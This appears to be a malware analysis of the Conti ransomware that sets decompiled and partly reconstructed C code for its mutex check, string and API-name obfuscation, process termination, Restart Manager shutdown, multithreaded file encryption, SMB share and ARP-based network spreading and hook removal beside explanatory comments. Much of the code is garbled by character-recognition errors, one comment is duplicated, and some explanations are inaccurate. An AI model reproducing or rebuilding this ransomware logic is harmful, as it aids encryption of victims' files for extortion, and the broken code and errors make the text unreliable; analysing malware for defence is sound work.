HIBYTE(s_CONTI_mutex[0]) = 79; //using the HIBYTE() macro. It then sets the second element of the array to a large integer value.
s_CONTI_mutex[1] = 241072925;
qmemcpy (&v74,"LOv", 3); //copy the bytes "LOv" into a variable named v74
for ( i = 0; i < 8; ++i )
    *(s_CONTI_mutex + 1 + 3) = (35 * (118 - *(s_CONTI_mutex + 1 + 3)) % 127 + 127) % 127;
v82 = CreateMutexA(0, 1, s_CONTI_mutex + 3);
if (WaitForSingleobject(v82, 0) )
    ExitProcess (1);

/*
HIBYTE(§_CONTI_mutex[0]) = 79;: 
This sets the high-order byte of the first element in an array named _CONTI_mutex 
to the decimal value 79. The purpose of this line is not clear without additional context.

5_CONTI_mutex[1] = 241072925;: 
This sets the second element in the _CONTI_mutex array to the decimal value 241072925.

qmemcpy(&v74, "LOv", 3);: 
This uses the qmemcpy() function to copy the three characters "LOv" to a variable named v74.

for ( i = 0; i < 8; ++i ) *(5_CONTI_mutex + 1 + 3) = (35 * (118 - *(s_CONTI_mutex + 1 + 3)) % 127 + 127) % 127;: 
After that, the code enters a loop that iterates 8 times. 
In each iteration, 
the third element of the s_CONTI_mutex array is modified using 
a formula that involves the value of the byte at the same position in the array. 
This formula is likely another obfuscation technique.

v82 = CreateMutexA(0, 1, 5_CONTI_mutex + 3);: 
Once the loop has finished, the CreateMutexA() function is called to create a new mutex object. 
The third argument to this function is a pointer to the fourth element of the s_CONTI_mutex array, which appears to be used as a name for the mutex. The second argument to the function is set to 1, indicating that the mutex is initially owned by the calling thread.

if (WaitForSingleobject(v82, 0)) 
ExitProcess(1);: 
This waits for the mutex to become available using the WaitForSingleobject() function. 
If the function returns a non-zero value, indicating that the mutex was not acquired, 
the program exits using the ExitProcess() function with an exit code of 1.

the mutex name is obfuscated during the compilation process using the OBFA macro. 
This mutex is required to prevent two instances of ransomware from running simultaneously, 
which can interfere with and slow the encryption process
*/

unsigned int8 * thiscall decrypt_string(unsigned int8 *encoded_string)
{
int str_size; // ebx
unsigned int8 *cur_byte; // edi
unsigned int8 next_byte; // al
if ( *encoded string )
    return encoded string + 1;
str_size = 12;
cur_byte = encoded_string + 1;
do
{
    next_byte = *cur_byte++;
    *(cur_byte - 1) = (26 * (115 - next_byte) % 127 + 127) % 127;
    --str size;
}
while ( str_size );
return encoded_string + 1;
}

/*
This obfuscation function is used to decrypt an encoded string that contains the names of 
Windows API calls used by the malware. The encoding is performed by subtracting each character 
from 115 and then multiplying the result by 26 modulo 127. The resulting number is then 
converted back to a character by adding 127 and taking the result modulo 127.

This obfuscation technique helps to hide the API calls from detection by security software 
that looks for specific strings or patterns in the code. By decrypting the API call names 
at runtime, the malware can avoid detection and make it harder for security researchers to 
analyze its behavior.
*/

var_EBFE_BB[0] = 0;
var_EBFE_BB[1] = 34;
var_EBFE_BB[2] = 77;
var_EBFE_BB[31] = 57;
var_EBFE_BB[4] = 2;
qmemcpy(enc_CreateFileW, ")9kp:97a", sizeof(enc_CreateFileW));
s_CreateFileW = decrypt_string_12(var_EBFE_BB);
CreateFileW = GetProcAddress (hModule, s_CreateFilew);
enc_GetFileSizeEx = 0;
qmemcpy (var_EBFE_BB2,"V/[dvL/-vla/r#@", , sizeof(var_EBFE_BB2));
s_GetFileSizeEx_BB = decrypt_string_13(&enc_GetFileSizeEx);
GetFileSizeEx = GetProcAddress (hModule, s_GetFileSizeEx_BB);

/*
In the code snippet you provided, the malware is using an obfuscation technique to hide 
the Windows API calls used by the malware. 
The code initializes an array var_EBFE_BB with various values and then 
uses a decryption function decrypt_string_12 to decrypt a string stored in s_CreateFileW. 
The decrypted string is then passed to the GetProcAddress function to resolve the actual API 
function pointer, which is then stored in CreateFileW global variable for later 
use in the malware.

Similarly, another string is decrypted using the decrypt_string_13 function and 
then passed to the GetProcAddress function to resolve the API function pointer 
for GetFileSizeEx. The resolved function pointer is stored in the GetFileSizeEx 
global variable for later use.

This obfuscation technique makes it difficult for analysts to understand the 
malware's behavior by obfuscating the API function names used by the malware. 
This can make it harder to detect and analyze the malware.In the code snippet you provided, 
the malware is using an obfuscation technique to hide the Windows API calls used by 
the malware. The code initializes an array var_EBFE_BB with various values and then 
uses a decryption function decrypt_string_12 to decrypt a string stored in s_CreateFileW. 
The decrypted string is then passed to the GetProcAddress function to resolve the actual 
API function pointer, which is then stored in CreateFileW global variable for later use 
in the malware.

Similarly, another string is decrypted using the decrypt_string_13 function and then 
passed to the GetProcAddress function to resolve the API function pointer for GetFileSizeEx. 
The resolved function pointer is stored in the GetFileSizeEx global variable for later use.

This obfuscation technique makes it difficult for analysts to understand the 
malware's behavior by obfuscating the API function names used by the malware. 
This can make it harder to detect and analyze the malware.
*/

if ( Process32FirstW(hProcessSnap, &process) )
{
do
HIBYTE (v74) = 0;
s_sq1[0] = 0x2B;
s_5q1[1] = 0x1B;
s_sq1[2] = 0x58;
s_sal[3] = 0x1B;
v76 = 0x1B1B1B0A;
for ( j = 0; j < 8; ++j )
    s_sql[j] = (31 * (s_sql[j] - 27) % 127 + 127) % 127;
if (StrStrIW(process.szExeFile, s_sql) )
{
    hProcess = OpenProcess (PROCESS_TERMINATE, FALSE, process.th32ProcessID);
    if ( Process )
    {
        TerminateProcess (hProcess, 0);
        CloseHandle 0(hProcess);    
    }
}
}
while ( Process32NextW(hProcessSnap, &process) );

/*
This code appears to be enumerating through a list of running processes on the system using 
the Process32FirstW() and Process32NextW() functions. 
It then checks if the name of the process executable contains a specific string that has been 
obfuscated using a custom algorithm involving byte manipulation and modulo arithmetic.

If the process name matches the string, 
the code proceeds to open the process with OpenProcess() and terminates it 
with TerminateProcess() using a handle to the process. Finally, 
the handle is closed with CloseHandle().
*/



rgsFileNames = Overlapped-›Offset;
if ( !RmStartSession (&dwSessionHandle, 0, stressionKey) )
{
    if ( !RmRegisterResources (dwSessionHandle, 1u, &rgsFileNames, 0, 0, 0, 0) )
    {
        dwRebootReasons = 0;
        pnProcInfoNeeded = 0;
        pnProcInfo = 0;
        if ( RmGetList(dwSessionHandle, &pnProcInfoNeeded, &pnProcInfo, 0, &dwRebootReasons) != ERROR_MORE_DATA 
        || !pnProcInfoNeeded )
        {
            RmEndSession(dwSessionHandle);
            return 0;
        }
        error_msg_rm = RmShutdown(dwSessionHandle, RmForceShutdown, NULL) == 0;
    }
    RmEndSession (dwSessionHandle);
}
/*
This code snippet appears to be using the Restart Manager API to register resources for a session and then shut down the session.

Here's a breakdown of what's happening:

rgsFileNames is assigned the value of Overlapped-›Offset. Overlapped is likely a pointer to an OVERLAPPED structure, 
which typically contains an offset value for an I/O operation.
RmStartSession is called to start a new session and obtain a session handle in dwSessionHandle. 
If this call fails, the function will exit and return 0.
RmRegisterResources is called to register the resource(s) specified in rgsFileNames for the session identified by dwSessionHandle. 
If this call fails, RmGetList and RmShutdown are called to terminate the session and release any resources associated with it.
RmGetList is called to obtain a list of all processes and services using the registered resources. 
If this call fails due to ERROR_MORE_DATA, pnProcInfoNeeded is set to the required buffer size and 
the function will exit and return 0. Otherwise, RmEndSession is called to terminate the session.
RmShutdown is called to force any processes and services using the registered resources to shut down. 
If this call succeeds, error_msg_rm is set to true.
Overall, this code appears to be used for managing resources and gracefully shutting down any processes or services 
that may be using those resources.
*/



/*
Once the system has been prepared and files have been identified, Conti will begin the process of iterating through each folder, 
creating a ransom note, and encrypting files to have a file extension of “.CONTI”. 

The ransom note, named CONTI_README.txt, is retrieved from the executable’s resources as shown earlier. 
Its status as a resource allows the adversary to quickly change the note on-the-fly without recompiling the executable. 
*/

hPort_0 = CreateIoCompletionPort( INVALID_HANDLE_VALUE, NULL, NULL, 32);


encrypted_data = VirtualAlloc(0, 5242912, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE) ;
if (!encrypted data )
    RtlExitUserThread(0);
if ( !encryption init(&hProv) )
    RtlExitUserThread(1);
if ( !CryptImportkey(hProv, &pbData, 4096u, 0, 0, &hKey) )
    RtlExitUserThread (1);
while (1 )
{
    if (!GetQueuedCompletionStatus (
            *Sport_object-›CompletionPort,
            &Number0fBytesTransferred,
            &CompletionKey,
            &Overlapped,
            INFINITE) )
        BtlExitUserThread(1);
    if ( CompletionKey == 666 )
    break;
    if ( encrypt_file(encrypted_data, Overlapped, hProv, hKey) )

}
/*
This code snippet appears to be using the Windows CryptoAPI to encrypt data in a file. Here's a breakdown of what's happening:

A buffer of size 5242912 bytes is allocated using the VirtualAlloc function. This buffer is used to hold the encrypted data.
If the buffer allocation fails, the thread is exited with a return value of 0.
The encryption context is initialized using the encryption_init function. 
If initialization fails, the thread is exited with a return value of 1.
The key used for encryption is imported using the CryptImportKey function. If import fails, 
the thread is exited with a return value of 1.
The thread enters an infinite loop.
The GetQueuedCompletionStatus function is called to wait for completion notifications 
from the specified I/O completion port. This function blocks the thread until 
a completion packet is available or an error occurs.
If the completion key is equal to 666, the loop is exited and the thread terminates.
Otherwise, the encrypt_file function is called to encrypt the data in the 
Overlapped buffer using the encryption context and key.
The loop continues from step 6.

The malware then uses the PostQueuedCompletionStatus() call to pass the path of the file 
to be encrypted into the thread. GetQueuedCompletionPort() to receive the results of the 
thread and finalize the encryption
*/

if ( network_flag_val == 10 || network_flag_val = 12 )// default or encrypt-mode network
{
    hostname = config_hostnames;
    for ( k = config hostnames; hostname; k = hostname )
    {
        shared resources = 0;
        count_resources = 0;
        total entries = ;
        resume handle = 0:
        while (1)
        {
            error msg = NetShareEnum(
                            hostname,
                            1,
                            &shared_resources,
                            MAX PREFERRED LENGTH,
                            &count_resources,
                            &total_entries,
                            &resume_handle);
            
            if ( !error_msg )
                break;
            if ( error_msg = ERROR_MORE_DATA )
                goto next_hostname;
        }
        entry_count = 1;
        entry_count_orig = 1;
        if ( count_resources )
        {
            do
            {
                if ( Ishared_resources->shi1_type )
                {}
            }
        }
    }
}
/*
If the malware is set to encrypt the network shares, 
it will perform just a few different operations. 
This starts with determining if the “-h” command line argument 
was used to provide a list of hostnames to process. If so, 
those hosts are immediately scanned with the NetShareEnum() API call to 
determine if they have open SMB network shares. If so, 
those shares are reviewed for files to encrypt.

The encryption modes provided by the malware are four. Each of them has an unique identificatory globally defined inside an Enum
Structure. So, when the command line is parsed, there is a different routine to encrypt.
The methods are:
• ALL_ENCRYPT (code 10): encrypt both local and network files
• LOCAL_ENCRYPT (code 11): encrypt only the files on the local machines
• NETWORK ECRYPT (code 12): encrypt only files inside the networks through SMB protocols
• BACKUPS_ENCRYPT (code 13): encrypt backups

*/


if ( GetIpNetTable (IpNetTable, &size_IP_Table, FALSE) )
{
    V7 = GetProcessHeap (0, IpNetTable );
    HeapFree(v7) ;
    return 0;
}
bool_arp_empty = IpNetTable->dwNumEntries == 0;
arp_counter = 0;
if ( !bool_arp_empty )
{}

/*
The code appears to be checking the result of calling the GetIpNetTable function to retrieve 
the ARP table for the local computer. 
If the function call succeeds, the code checks if the table is empty by examining the 
dwNumEntries field of the MIB_IPNETTABLE structure. 
If the table is not empty, the code proceeds to execute some logic 
that is not shown in the provided snippet. If the function call fails, 
the code frees any memory allocated for the IpNetTable structure using the 
HeapFree function and returns 0.

Once the ARP cache is acquired, Conti will perform one more set of checks to ensure 
that the IP addresses it connects to begin with either “172.”, “192.168.”, or “10.”.

Once the remote machines have been assessed, 
Conti will then create a similar approach of encryption as local files by using 32 threads 
to enumerate through each share and encrypt data. 

Overall, Conti represents a unique twist in modern ransomware. 
We have tracked numerous families that are designed to be driven by the adversary 
while on the network, with access gained through weak RDP access or 
vulnerable Internet-facing services. 
Conti shows an intention behind the actor to also respond to 
reconnaissance to determine worthwhile servers in the environment 
that are sensitive to data encryption. 
It’s implementation of multi-threaded processing, 
as well as the use of the Windows Restart Manager, shows a feature of incredibly quick, 
and thorough, encryption of data. 
The use of large-scale service termination supports this with a focus on targeting 
a vast array of applications that can be found all across the small business and 
enterprise fields. 
*/



/*
Conti ransomware uses its own implementsation of AES-256 the uses up to 32 inividual logil threads, making it much faster than most ransomware

• Once on a system it will try to delete Volume Shadow Copies.
• It will try to terminate a number of services using Restart Manager to ensure it can
encrypt files used by them.
• It will disable real time monitor and uninstall the Windows Defender application
• Default behaviour is to encrypt all files on local and networked Server Message Block
drives, ignoring files with DLL, exe, sys and Ink extensions.
• It is also able to target specific drives as well as individual IP addresses.


COMMON ATTACK VECTORS
• Remote Desktop Protocol (34%)
• Phising Emails (33%)
• Software/Hardware Vulnerabilities (33%)
CVEs being exploited by the Conti group 
CVE-2020-0796,
CVE-2018-13374, 
CVE-2018-13379
*/

/*
Stream ciphers and block ciphers are two types of encryption algorithms 
that are used for different purposes. The main difference between them is in the way 
they process data.

The Conti ransomware uses both the ChaCha20 and AES encryption algorithms. 
ChaCha20 is used to encrypt the file content, while AES is used to encrypt the file's key. 
The use of two different encryption algorithms adds an extra layer of security and complexity
to the encryption process, making it more difficult to decrypt the files without the proper 
decryption key.

A block cipher processes data in fixed-size blocks, typically 128 bits or 256 bits. 
It divides the plaintext into blocks and encrypts each block independently, 
usually with a key-dependent permutation of the block. 
The output of one block is used as an input to the next block, and 
so on until the end of the message. 
This results in a ciphertext that is the same length as the plaintext, but scrambled.

A stream cipher, on the other hand, encrypts the data bit-by-bit or byte-by-byte, 
generating a keystream that is combined with the plaintext to produce the ciphertext. 
The keystream is typically generated using a pseudo-random number generator (PRNG) that 
takes a secret key as input. The output of the PRNG is XORed with the plaintext to produce 
the ciphertext.

The main advantage of a stream cipher is that it can be faster and more efficient than a 
block cipher, especially for encrypting large amounts of data. This is because 
it doesn't require the data to be divided into fixed-size blocks, which can result in 
padding and additional processing overhead. However, 
it can also be more vulnerable to certain types of attacks, such as a known plaintext attack 
or a message replay attack, if the same key and nonce are used to encrypt multiple messages. 
Block ciphers, on the other hand, are more resistant to these types of attacks and are 
commonly used for applications that require stronger security guarantees, 
such as disk encryption or TLS.
*/



api:: InitializeApiModule()
{
    g_hKerne132 - GetKerne132();
    
    DWORD dwLoadLibraryA;
    GetApiAddr(g_hKerne132, LOADLIBRARYA_HASH, &dwLoadLibraryA);
    pLoadLibraryA = fnLoadLibraryA(dwtoadLibraryA - 2);
    if (!pLoadLibraryA) {
        return FALSE;
    }

    g_Apicache = (LPVOID*)m_malloc(API_CACHE_SIZE);
    if (!g ApiCache) {
        return FALSE;
    }

    return TRUE;
}


VOID GetApiAddr (HMODULE Module, DWORD ProcNameHash, PDWORD Address)
{
    PIMAGE_OPTIONAL_HEADER poh = (PIMAGE_OPTIONAL_HEADER) ((char*)Module + ((PIMAGE_DOS_HEADER)Module)->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
    PIMAGE_EXPORT_DIRECTORY Table = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(Module, poh->DataDirectory [IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD Datasize = poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    INT Ordinal; // fildo faiáoiaelié idi dolêdèe
    BOOL Found = FALSE;
    
    if (HIWORD(ProcNameHash) == 0){
        Ordinal = (loword(ProcNameHash)) - Table->Base;
    }
    else
    {
        PDWORD NamesTable = (DWORD*)RVATOVA (Module, Table->AddressONames);
        PWORD OrdinalTable = (WORD*)RVATOVA(Module, Table ›AddressOfNameOrdinals);

        unsigned int i;
        char* ProcName;

        for (i = 0; 1 < Table->NumberofNames; ++i)
        {
            ProcName = (char*)RVATOV^(Module, *NamesTable);

            if (MurmurHash2A(ProcName, StrLen(ProcName), HASHING_SEED) == ProcNameHash)
            {
                Ordinal = *OrdinalTable;
                Found = TRUE;
                    break;
            }

    }
}

#include "hash.h"
#include "memory.h"

#define mmix(h,k) { k *= m; k ^= k > r; k *= m; h *= m; h ^= k; 3
#define LowerChar(C) if (C >= 'A' &6 C <= 'Z') {C = C + ('a'-'A'); }

unsigned int MurmurHash2A(const void* key, int len, unsigned int seed)
{
    char temp [64];
    RtlSecureZeroMemory(temp, 64);
    memory: :Copy(temp, (PVOID)key, len);

    for (int i = 0; i < len; i++) {
            LowerChar(temp[i]);
    }

    const unsigned int m = 0x5bdle995;
    const int r = 24:
    unsigned int 1 = len;
    const unsigned char* data = (const unsigned char*)temp;
    unsigned int h = seed;
    unsigned int k;


VOID
api::DisableHooks()
{
    hKerne132 = pLoadLibraryA(OBFA("kerne132.d11"));
    his2_32 = pLoadLibraryA(OBFA("WS2_32.d11"));
    hAdvap132 = pLoadLibraryA(OBFA("Advap132.d11"));
    hNtdI1 = pLoadLibraryA(OBFA("ntdll.dIl"));
    hrstrtmgr = pLoadLibraryA(OBFA("Rstrtmgr.d11"));
    hole32 = pLoadLibraryA(OBFA("0le32.d11"));
    holeAut = pLoadLibraryA(OBFA("OleAut32.d11"));
    hNetApi32 = pLoadLibraryA(OBFA("Netapi32.d11"));
    hIphIp32 = pLoadLibraryA(OBFA("IphIpapi.d11"));
    hshlwapi = pLoadLibraryA(OBFA("ShIwapi.d11"));
    hShel132 = pLoadLibraryA(OBFA("She1132.d11"));
    if (hNtd11) {
    removeHooks (hNtd11);
    }
    if (hKerne132) {
    removeHooks (hKerne132);
}
